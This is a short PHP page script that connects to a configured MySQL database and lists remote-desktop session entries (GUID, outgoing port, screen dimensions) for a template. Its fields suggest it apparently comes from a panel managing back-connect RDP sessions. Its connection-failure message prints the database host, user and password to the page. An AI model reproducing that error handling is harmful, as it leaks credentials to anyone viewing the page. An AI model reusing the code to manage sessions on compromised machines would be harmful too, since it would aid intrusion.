<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/functs.php";
	if( !$user->Check() ) exit;
	
	Error_Reporting (E_ERROR | E_PARSE);

	$icfg = $db->GetConfigs();
	$host = $icfg['rdp_host'];
	$user = $icfg['rdp_user'];
	$password = $icfg['rdp_password'];
	$db_ = $icfg['rdp_db'];
	$table = $icfg['rdp_table'];

	$smarty->assign('HOST', $icfg['rdp_server_ip']);
	
	$db2 = new mysqli($host, $user, $password, $db_);
	
	if ( !is_object($db2) || !$db2->ping() ) 
	{
		die("<font class='error'>Connect failed</font> : ".$db2->connect_error."<br>$host:$user:$password:$db_");
	}	
	
	$sql = "SELECT uid, port_out, dwWidth, dwHeigth, dwDepth FROM $table";
	$rs = $db2->query($sql);
	
	if (@$rs)
	{
		if ( $db2->affected_rows )
		{
			$RES = array();
			for ( $i = 0; list($guid, $port, $w, $h, $d) = $rs->fetch_row(); $i++ ) 
			{
				$RES[] = array('I'=>$i, 'GUID'=>$guid, 'HOST'=>$icfg['rdp_server_ip'], 'PORT'=>$port, 'w'=>$w, 'h'=>$h, 'd'=>$d);
			}
			$smarty->assign('CONT_ARR', $RES);
		}
	}
	else
	{
		die("<font class='error>ERROR</font> : Table is not exists ? ( $sql )");
	}
	$smarty->display('rdp.tpl');
?>